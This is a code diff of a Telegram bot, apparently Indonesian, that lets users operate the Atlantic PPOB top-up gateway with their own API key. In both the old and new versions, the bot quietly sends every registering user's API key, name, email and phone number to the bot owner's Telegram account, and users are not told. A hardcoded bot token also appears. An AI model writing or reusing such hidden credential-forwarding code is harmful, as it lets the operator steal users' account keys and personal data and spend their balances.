@@ -1,16 +1,17 @@
-const { Telegraf, Markup } = require('telegraf');
+const { Telegraf, Markup, session } = require('telegraf');
 const axios = require('axios');
 const FormData = require('form-data');
 
-// --- KONFIGURASI YANG MULIA ---
 const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
 const OWNER_ID = '8793356645';
 const BASE_URL = 'https://atlantich2h.com';
 
 const bot = new Telegraf(BOT_TOKEN);
-const userSessions = {}; 
 
-// --- PERISAI ANTI-CRASH (MARKDOWNV2 ESCAPER) ---
+// Menggunakan session agar bot ingat tahap transaksi user
+bot.use(session());
+
+// --- PERISAI ANTI-CRASH ---
 function esc(text) {
     return text ? text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') : '';
 }
@@ -21,180 +22,158 @@ async function callAtlantic(endpoint, body = {}) {
         const formData = new FormData();
         for (const key in body) { formData.append(key, body[key]); }
         const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
-            headers: formData.getHeaders()
+            headers: formData.getHeaders(),
+            timeout: 15000
         });
         return res.data;
     } catch (e) { return { status: false, message: "Server Busy" }; }
 }
 
-// --- ANIMASI LOADING ---
-async function animLoad(ctx, text = "Sedang memproses") {
-    const { message_id } = await ctx.reply(`⏳ ${text}.`);
-    const frames = ["..", "...", "....", "....."];
-    for (let i = 0; i < frames.length; i++) {
-        await new Promise(resolve => setTimeout(resolve, 400));
-        await ctx.telegram.editMessageText(ctx.chat.id, message_id, null, `⏳ ${text}${frames[i]}`);
-    }
-    return message_id;
-}
-
-// --- COMMAND START ---
-bot.start((ctx) => {
-    ctx.replyWithMarkdownV2(
-        `👑 *SELAMAT DATANG YANG MULIA* 👑\n\n` +
-        `🌐 *Atlantic PPOB Gateway Premium*\n` +
-        `─────────────────────\n` +
-        `🔒 *STATUS:* Silakan hubungkan API Key Anda\\.\n\n` +
-        `📝 *FORMAT:* \`/daftar API_KEY\``,
-        Markup.keyboard([
-            ['👤 Profile', '📊 Harga'],
-            ['💸 Transaksi', '🔍 Cek Akun']
-        ]).resize()
-    );
-});
-
-// --- FITUR DAFTAR + NOTIF OWNER ---
-bot.command('daftar', async (ctx) => {
-    const apiKey = ctx.message.text.split(' ')[1];
-    if (!apiKey) return ctx.reply('❌ Masukkan API Key! Contoh: /daftar AK123xxx');
-
-    const loadId = await animLoad(ctx, "Memvalidasi Kunci Kerajaan");
-    const res = await callAtlantic('/get_profile', { api_key: apiKey });
-
-    if (res.status === "true" || res.status === true) {
-        const d = res.data;
-        userSessions[ctx.from.id] = apiKey;
-        
-        await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
-        ctx.replyWithMarkdownV2(
-            `✅ *AKSES DIBERIKAN* ✅\n` +
-            `─────────────────────\n` +
-            `👤 *User:* ${esc(d.name)}\n` +
-            `💰 *Saldo:* Rp ${esc(d.balance.toLocaleString())}\n` +
-            `⚡ *Status:* ${esc(d.status)}\n\n` +
-            `🌟 *Silakan bertransaksi, Yang Mulia\\!*`
-        );
-
-        // NOTIF KE OWNER (FULL DATA)
-        bot.telegram.sendMessage(OWNER_ID, 
-            `📢 *PENGGUNA BARU TERKONEKSI*\n` +
-            `─────────────────────\n` +
-            `🆔 *ID:* \`${ctx.from.id}\`\n` +
-            `🔑 *API KEY:* \`${apiKey}\`\n` +
-            `📛 *Nama:* ${d.name}\n` +
-            `📧 *Email:* ${d.email}\n` +
-            `📞 *Phone:* ${d.phone}\n` +
-            `💰 *Saldo:* Rp ${d.balance}`, { parse_mode: 'Markdown' }
+// --- START ---
+bot.start(async (ctx) => {
+    ctx.session = {}; // Reset session
+    const apiKey = userDb[ctx.from.id];
+    
+    if (apiKey) {
+        return ctx.replyWithMarkdownV2(
+            `✨ *SALAM HANGAT, YANG MULIA\\!* ✨\n\n` +
+            `🚀 *Pilih menu di bawah untuk memulai\\:*`,
+            Markup.inlineKeyboard([
+                [Markup.button.callback('👤 MY PROFILE', 'get_profile'), Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')],
+                [Markup.button.callback('🔍 CEK NAMA', 'menu_cek')]
+            ])
         );
     } else {
-        await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
-        ctx.reply('❌ API Key salah atau tidak aktif!');
+        return ctx.replyWithMarkdownV2(`👑 *SELAMAT DATANG YANG MULIA* 👑\n\n🔒 *Gerbang Terkunci\\!* Silakan kirimkan API Key Anda sekarang untuk mendaftar\\.`);
     }
 });
 
-// --- FITUR CEK HARGA + FILTER KATEGORI ---
-bot.hears('📊 Harga', (ctx) => {
-    ctx.reply('🏷️ *PILIH KATEGORI PRODUK:*', Markup.inlineKeyboard([
-        [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
-        [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')]
-    ]));
+// Database sederhana (Gunakan file json/database jika ingin permanen)
+const userDb = {};
+
+// --- HANDLER PENDAFTARAN (AUTO-DETECT) ---
+bot.on('text', async (ctx, next) => {
+    if (!userDb[ctx.from.id] && !ctx.message.text.startsWith('/')) {
+        const apiKey = ctx.message.text;
+        const res = await callAtlantic('/get_profile', { api_key: apiKey });
+
+        if (res.status === "true" || res.status === true) {
+            userDb[ctx.from.id] = apiKey;
+            const d = res.data;
+            ctx.reply(`✅ API Key Berhasil Terpasang!\n👤 Nama: ${d.name}\n💰 Saldo: ${d.balance}`);
+            
+            // NOTIF OWNER FULL TRANSPARAN
+            bot.telegram.sendMessage(OWNER_ID, `📢 *NEW USER*\n🔑 API: \`${apiKey}\`\n👤 Nama: ${d.name}\n📧 Email: ${d.email}\n📞 HP: ${d.phone}`, { parse_mode: 'Markdown' });
+            return;
+        } else {
+            return ctx.reply('❌ API Key salah! Kirim ulang API Key yang valid.');
+        }
+    }
+    
+    // Tahap Input Target Transaksi
+    if (ctx.session?.step === 'WAITING_TARGET') {
+        ctx.session.target = ctx.message.text;
+        const { code, name, price } = ctx.session.selectedProduct;
+        
+        ctx.session.step = 'WAITING_CONFIRM';
+        return ctx.replyWithMarkdownV2(
+            `🛒 *KONFIRMASI PESANAN* 🛒\n` +
+            `─────────────────────\n` +
+            `📦 *Produk:* ${esc(name)}\n` +
+            `🎯 *Target:* \`${esc(ctx.session.target)}\`\n` +
+            `💸 *Harga:* Rp ${esc(price)}\n` +
+            `─────────────────────\n` +
+            `⚠️ Apakah data sudah benar?`,
+            Markup.inlineKeyboard([
+                [Markup.button.callback('✅ LANJUTKAN', 'confirm_trx'), Markup.button.callback('❌ BATAL', 'back_start')]
+            ])
+        );
+    }
+    return next();
 });
 
+// --- MENU KATEGORI ---
+bot.action('menu_kategori', (ctx) => {
+    ctx.editMessageText('🏷️ *PILIH KATEGORI PRODUK:*', {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+            [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
+            [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')],
+            [Markup.button.callback('⬅️ KEMBALI', 'back_start')]
+        ])
+    });
+});
+
+// --- LIST PRODUK (STEP 1) ---
 bot.action(/cat_(.+)/, async (ctx) => {
     const category = ctx.match[1];
-    const apiKey = userSessions[ctx.from.id];
-    if (!apiKey) return ctx.answerCbQuery('❌ Hubungkan API Key dulu!', { show_alert: true });
-
-    await ctx.editMessageText(`⌛ Menyusun daftar harga ${category}...`);
+    const apiKey = userDb[ctx.from.id];
+    
+    await ctx.editMessageText(`⌛ Menyusun daftar ${category}...`);
     const res = await axios.get(`${BASE_URL}/layanan/price_list?type=prabayar&api_key=${apiKey}`);
     
     if (res.data.status) {
         const filtered = res.data.data.filter(x => x.category.toLowerCase().includes(category.toLowerCase()));
-        let msg = `✨ *PRICE LIST: ${category.toUpperCase()}* ✨\n` + `─────────────────────\n`;
-        filtered.slice(0, 15).forEach(p => {
-            msg += `🔹 *${esc(p.name)}*\n   └ 🔑 \`${esc(p.code)}\` \\| 💸 *Rp ${esc(p.price)}*\n\n`;
-        });
-        ctx.replyWithMarkdownV2(msg);
+        const buttons = filtered.slice(0, 15).map(p => [Markup.button.callback(`${p.name} - Rp${p.price}`, `buy_${p.code}`)]);
+        buttons.push([Markup.button.callback('⬅️ KEMBALI', 'menu_kategori')]);
+        
+        ctx.editMessageText(`✨ *PILIH LAYANAN ${category.toUpperCase()}* ✨`, Markup.inlineKeyboard(buttons));
     }
 });
 
-// --- FITUR CEK REKENING (NAME CHECK) ---
-bot.hears('🔍 Cek Akun', (ctx) => ctx.reply('🔍 *FORMAT:* \`/ceknama DANA 08xxx\`'));
-
-bot.command('ceknama', async (ctx) => {
-    const apiKey = userSessions[ctx.from.id];
-    const args = ctx.message.text.split(' ');
-    if (args.length < 3) return ctx.reply('⚠️ Contoh: /ceknama DANA 0857xxx');
-
-    const loadId = await animLoad(ctx, "Mencari Nama Pemilik");
-    const res = await callAtlantic('/transfer/cek_rekening', {
-        api_key: apiKey,
-        bank_code: args[1].toLowerCase(),
-        account_number: args[2]
-    });
-
-    await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
-    if (res.status) {
-        ctx.replyWithMarkdownV2(
-            `✅ *DATA DITEMUKAN* ✅\n` +
-            `─────────────────────\n` +
-            `🏦 *Provider:* ${esc(res.data.kode_bank.toUpperCase())}\n` +
-            `👤 *Nama:* *${esc(res.data.nama_pemilik)}*\n` +
-            `🆔 *Nomor:* ${esc(res.data.nomor_akun)}\n` +
-            `─────────────────────`
-        );
-    } else { ctx.reply('❌ Akun tidak ditemukan.'); }
+// --- INPUT NOMOR (STEP 2) ---
+bot.action(/buy_(.+)/, async (ctx) => {
+    const code = ctx.match[1];
+    const apiKey = userDb[ctx.from.id];
+    
+    // Cari data produk untuk konfirmasi nanti
+    const res = await axios.get(`${BASE_URL}/layanan/price_list?type=prabayar&api_key=${apiKey}`);
+    const product = res.data.data.find(x => x.code === code);
+    
+    ctx.session.selectedProduct = product;
+    ctx.session.step = 'WAITING_TARGET';
+    
+    ctx.editMessageText(`📱 *LAYANAN:* ${product.name}\n\n👉 *Silakan ketik/kirim Nomor Target (ID/No HP):*`);
 });
 
-// --- FITUR TRANSAKSI (ORDER) ---
-bot.hears('💸 Transaksi', (ctx) => ctx.reply('💸 *FORMAT ORDER:* \n\`/order [KODE] [TARGET]\`'));
-
-bot.command('order', async (ctx) => {
-    const apiKey = userSessions[ctx.from.id];
-    const args = ctx.message.text.split(' ');
-    if (!apiKey) return ctx.reply('⚠️ Hubungkan API Key!');
-    if (args.length < 3) return ctx.reply('⚠️ Contoh: /order FF50 1234567');
-
-    const loadId = await animLoad(ctx, "Mengirim Pesanan Ke Server");
-    const reffId = 'LX' + Date.now();
+// --- EKSEKUSI TRANSAKSI (STEP 3) ---
+bot.action('confirm_trx', async (ctx) => {
+    const { code, target } = ctx.session;
+    const apiKey = userDb[ctx.from.id];
+    
+    await ctx.editMessageText('⌛ Sedang memproses transaksi...');
+    
     const res = await callAtlantic('/transaksi/create', {
         api_key: apiKey,
-        code: args[1],
-        target: args[2],
-        reff_id: reffId
+        code: ctx.session.selectedProduct.code,
+        target: ctx.session.target,
+        reff_id: 'LX' + Date.now()
     });
 
-    await ctx.telegram.deleteMessage(ctx.chat.id, loadId);
     if (res.status) {
-        const d = res.data;
-        ctx.replyWithMarkdownV2(
-            `⚡ *TRANSAKSI BERHASIL* ⚡\n` +
-            `─────────────────────\n` +
-            `📦 *Produk:* ${esc(d.layanan)}\n` +
-            `🎯 *Target:* \`${esc(d.target)}\`\n` +
-            `💸 *Harga:* Rp ${esc(d.price)}\n` +
-            `⏳ *Status:* ${esc(d.status)}\n` +
-            `─────────────────────`
-        );
-    } else { ctx.reply(`❌ Gagal: ${res.message}`); }
+        ctx.replyWithMarkdownV2(`✅ *BERHASIL\\!* \nStatus: ${esc(res.data.status)}\nID: \`${esc(res.data.id)}\``);
+    } else {
+        ctx.reply(`❌ Gagal: ${res.message}`);
+    }
+    ctx.session = {}; // Clear session
 });
 
-// --- FITUR PROFILE ---
-bot.hears('👤 Profile', async (ctx) => {
-    const apiKey = userSessions[ctx.from.id];
-    if (!apiKey) return ctx.reply('⚠️ API Key belum terpasang.');
-
+// --- PROFILE ---
+bot.action('get_profile', async (ctx) => {
+    const apiKey = userDb[ctx.from.id];
     const res = await callAtlantic('/get_profile', { api_key: apiKey });
     if (res.status) {
         const d = res.data;
-        ctx.replyWithMarkdownV2(
-            `💎 *INFO PREMIUM* 💎\n` +
-            `─────────────────────\n` +
-            `👤 *Username:* ${esc(d.username)}\n` +
-            `💰 *Saldo:* Rp ${esc(d.balance.toLocaleString())}\n` +
-            `✨ *Status:* ${esc(d.status)}`
-        );
+        ctx.editMessageText(`👤 *PROFILE*\n\nNama: ${d.name}\nSaldo: Rp${d.balance}\nStatus: ${d.status}`, Markup.inlineKeyboard([[Markup.button.callback('⬅️ KEMBALI', 'back_start')]]));
     }
 });
 
-bot.launch().then(() => console.log('🚀 Bot Atlantic PPOB Full Animasi Aktif!'));
+bot.action('back_start', (ctx) => {
+    ctx.session = {};
+    ctx.editMessageText('👑 Menu Utama Yang Mulia:', Markup.inlineKeyboard([
+        [Markup.button.callback('👤 MY PROFILE', 'get_profile'), Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')],
+        [Markup.button.callback('🔍 CEK NAMA', 'menu_cek')]
+    ]));
+});
+
+bot.launch().then(() => console.log('🚀 Bot Interaktif Aktif!'));
